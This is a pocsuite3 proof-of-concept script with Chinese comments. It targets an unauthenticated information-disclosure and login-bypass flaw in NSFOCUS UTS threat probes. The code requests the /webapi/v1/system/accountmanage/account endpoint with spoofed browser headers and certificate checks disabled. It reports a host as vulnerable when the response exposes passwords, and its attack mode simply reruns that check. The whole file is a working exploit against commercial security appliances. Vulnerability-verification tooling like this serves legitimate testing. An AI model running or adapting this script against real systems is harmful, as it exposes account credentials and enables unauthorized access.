from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


class NSFOCUS_UTS(POCBase):
    vulID = "0"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "小白"  # PoC作者的大名
    vulDate = "2022-07-17"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-07-17"  # 编写 PoC 的日期
    updateDate = "2022-07-17"  # PoC 更新的时间,默认和编写时间一样
    references = ["http://wiki.peiqi.tech/wiki/webapp/%E7%BB%BF%E7%9B%9F/%E7%BB%BF%E7%9B%9F%20UTS%E7%BB%BC%E5%90%88%E5%A8%81%E8%83%81%E6%8E%A2%E9%92%88%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.html"]  # 漏洞地址来源,0day不用写
    name = "绿盟UTS综合威胁探针信息泄露登陆绕过漏洞"  # PoC 名称
    appPowerLink = ""  # 漏洞厂商主页地址
    appName = "NSFOCUS-UTS"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.INFORMATION_DISCLOSURE  #信息泄露 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # poc对应的产品类型 web的
    # samples = []  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """绿盟 UTS综合威胁探针 某个接口未做授权导致未授权漏洞"""  # 漏洞简要描述
    pocDesc = """ pocsuite -r .\*.py -u <url> """  # POC用法描述

    def _check(self):
        result = []
        full_url = f"{self.url}/webapi/v1/system/accountmanage/account"
        headers = {"Cache-Control": "max-age=0",
                   "Sec-Ch-Ua": "\" Not;A Brand\";v=\"99\", \"Microsoft Edge\";v=\"103\", \"Chromium\";v=\"103\"",
                   "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Dnt": "1",
                   "Upgrade-Insecure-Requests": "1",
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                   "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1",
                   "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate",
                   "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6", "Connection": "close"}

        try:
            response = requests.get(full_url, headers=headers, verify=False, timeout=10)
            if "password" in response.text:
                result.append(self.url)
        except Exception :
            pass
        finally:
                return result

    def _verify(self):
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(NSFOCUS_UTS)





